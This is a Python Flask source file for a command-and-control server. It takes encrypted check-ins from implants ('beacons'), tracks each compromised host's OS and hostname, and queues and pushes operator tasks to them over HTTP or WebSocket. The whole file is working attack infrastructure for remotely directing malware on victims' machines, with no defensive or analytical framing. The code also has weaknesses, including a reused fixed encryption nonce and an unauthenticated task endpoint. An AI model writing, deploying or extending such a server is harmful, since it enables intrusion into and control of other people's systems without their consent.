import asyncio
import base64
import json
import os
import sys
import threading
import time
import traceback
from pathlib import Path

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from flask import Flask, request, jsonify, send_from_directory
from flask_tls import TLS
from flask_sockets import Sockets
from modules.config import load_config
from modules.logger import log_event

cfg = load_config().get("c2", {}).get("http", {})
HOST = cfg.get("host", "0.0.0.0")
PORT = cfg.get("port", 8443)
USE_TLS = cfg.get("use_tls", True)
CERT = cfg.get("cert_file", "")
KEY = cfg.get("key_file", "")
AES_KEY = bytes.fromhex(cfg.get("aes_key", ""))
AES_IV = bytes.fromhex(cfg.get("aes_iv", ""))[:12]
MAX_RETRIES = cfg.get("max_retries", 3)
FALLBACK = cfg.get("fallback_interval", 600)

app = Flask(__name__, static_folder=str(Path(__file__).parent / "static"))
sockets = Sockets(app)
if USE_TLS:
    TLS(app, certfile=CERT, keyfile=KEY)

BEACON_TRACKER = {}
BEACON_LOCK = threading.Lock()
TASK_QUEUE = []
TASK_LOCK = threading.Lock()

# WebSocket connections: { beacon_id: ws }
WS_CONNECTIONS = {}

@app.route("/beacon", methods=["POST"])
def beacon():
    """
    Plain HTTP/AES‐GCM beacon. If "use_ws":true in beacon payload, instruct beacon to switch.
    """
    try:
        data = request.get_json()
        bid = data.get("id")
        ct_b64 = data.get("payload")
        if not bid or not ct_b64:
            return jsonify({"error": "Missing id or payload"}), 400

        ct = base64.b64decode(ct_b64)
        aesgcm = AESGCM(AES_KEY)
        try:
            pt = aesgcm.decrypt(AES_IV, ct, None).decode()
        except Exception as e:
            log_event("c2_server", f"Decryption error for {bid}: {e}".encode())
            return jsonify({"error": "Invalid ciphertext"}), 400

        info = json.loads(pt)
        ts = int(time.time())
        with BEACON_LOCK:
            BEACON_TRACKER[bid] = {
                "last_seen": ts,
                "os": info.get("os", ""),
                "hostname": info.get("hostname", ""),
                "use_ws": info.get("use_ws", False)
            }
        log_event("c2_server", f"HTTP Beacon {bid} checked in: {info}".encode())

        # If beacon wants WebSocket, respond with {"use_ws": true, "ws_path": "/ws/<bid>"}
        if info.get("use_ws", False):
            return jsonify({"use_ws": True, "ws_path": f"/ws/{bid}"}), 200

        # Otherwise, find HTTP task
        task_to_send = None
        with TASK_LOCK:
            for idx, entry in enumerate(TASK_QUEUE):
                if entry["beacon_id"] == bid:
                    task_to_send = entry
                    del TASK_QUEUE[idx]
                    break
        if task_to_send:
            ct2 = AESGCM(AES_KEY).encrypt(AES_IV, json.dumps(task_to_send["task"]).encode(), None)
            return jsonify({"task": base64.b64encode(ct2).decode()}), 200
        return jsonify({"task": ""}), 200

    except Exception as e:
        tb = traceback.format_exc()
        log_event("c2_server", f"Beacon error: {tb}".encode())
        return jsonify({"error": str(e)}), 500

@app.route("/addtask", methods=["POST"])
def add_task():
    try:
        data = request.get_json()
        bid = data.get("beacon_id")
        task = data.get("task")
        if not bid or not task:
            return jsonify({"error": "Missing beacon_id or task"}), 400
        entry = {"beacon_id": bid, "task": task, "retries": MAX_RETRIES}
        with TASK_LOCK:
            TASK_QUEUE.append(entry)
        log_event("c2_server", f"HTTP Added task for {bid}: {task}".encode())
        # If beacon has WS open, push immediately
        ws = WS_CONNECTIONS.get(bid)
        if ws:
            asyncio.run(_send_ws_task(bid, task))
        return jsonify({"status": "queued"}), 200
    except Exception as e:
        tb = traceback.format_exc()
        log_event("c2_server", f"Addtask error: {tb}".encode())
        return jsonify({"error": str(e)}), 500

@app.route("/beacons", methods=["GET"])
def list_beacons():
    with BEACON_LOCK:
        return jsonify(BEACON_TRACKER), 200

@sockets.route("/ws/<bid>")
def ws_beacon(ws, bid):
    """
    WebSocket endpoint for real‐time tasking.
    """
    BEACON_TRACKER[bid] = BEACON_TRACKER.get(bid, {})
    WS_CONNECTIONS[bid] = ws
    log_event("c2_server", f"WebSocket connected for {bid}".encode())
    try:
        while not ws.closed:
            msg = ws.receive()
            if msg is None:
                break
            # Expect JSON with {"payload": base64(AES‐GCM)}
            data = json.loads(msg)
            ct_b64 = data.get("payload")
            if ct_b64:
                ct = base64.b64decode(ct_b64)
                aesgcm = AESGCM(AES_KEY)
                pt = aesgcm.decrypt(AES_IV, ct, None).decode()
                info = json.loads(pt)
                with BEACON_LOCK:
                    BEACON_TRACKER[bid].update({
                        "last_seen": int(time.time()),
                        "os": info.get("os", ""),
                        "hostname": info.get("hostname", "")
                    })
                log_event("c2_server", f"WS Beacon {bid} info: {info}".encode())
            # Wait for a task
            with TASK_LOCK:
                for idx, entry in enumerate(TASK_QUEUE):
                    if entry["beacon_id"] == bid:
                        task = entry["task"]
                        del TASK_QUEUE[idx]
                        ct2 = AESGCM(AES_KEY).encrypt(AES_IV, json.dumps(task).encode(), None)
                        ws.send(json.dumps({"task": base64.b64encode(ct2).decode()}))
                        log_event("c2_server", f"WS Sent task to {bid}: {task}".encode())
                        break
            time.sleep(1)
    except Exception as e:
        log_event("c2_server", f"WS error for {bid}: {e}".encode())
    finally:
        del WS_CONNECTIONS[bid]
        log_event("c2_server", f"WebSocket closed for {bid}".encode())

async def _send_ws_task(bid: str, task: dict):
    """
    Helper to push a task over WebSocket without waiting for beacon’s next loop.
    """
    ws = WS_CONNECTIONS.get(bid)
    if not ws:
        return
    try:
        ct2 = AESGCM(AES_KEY).encrypt(AES_IV, json.dumps(task).encode(), None)
        await ws.send(json.dumps({"task": base64.b64encode(ct2).decode()}))
        log_event("c2_server", f"WS Pushed task to {bid}: {task}".encode())
    except Exception as e:
        log_event("c2_server", f"WS push error for {bid}: {e}".encode())

def retry_loop():
    while True:
        time.sleep(300)
        with TASK_LOCK:
            for entry in TASK_QUEUE:
                if entry["retries"] <= 0:
                    continue
                entry["retries"] -= 1
        log_event("c2_server", b"Retry loop tick: decremented retries.")

def start():
    """Start the C2 server in a new thread"""
    log_event("c2_server", b"Starting HTTP/S C2 server")
    
    # Start retry loop in a daemon thread
    t = threading.Thread(target=retry_loop, daemon=True)
    t.start()
    
    # Check SSL configuration
    if USE_TLS and (not os.path.exists(CERT) or not os.path.exists(KEY)):
        log_event("c2_server", b"TLS enabled but cert/key missing; falling back to HTTP")
        app.run(host=HOST, port=PORT)
    elif USE_TLS:
        app.run(host=HOST, port=PORT, ssl_context=(CERT, KEY))
    else:
        app.run(host=HOST, port=PORT)

if __name__ == "__main__":
    if USE_TLS and (not os.path.exists(CERT) or not os.path.exists(KEY)):
        log_event("c2_server", b"TLS enabled but cert/key missing; aborting.")
        sys.exit(1)

    t = threading.Thread(target=retry_loop, daemon=True)
    t.start()

    if USE_TLS:
        app.run(host=HOST, port=PORT, ssl_context=(CERT, KEY))
    else:
        app.run(host=HOST, port=PORT)
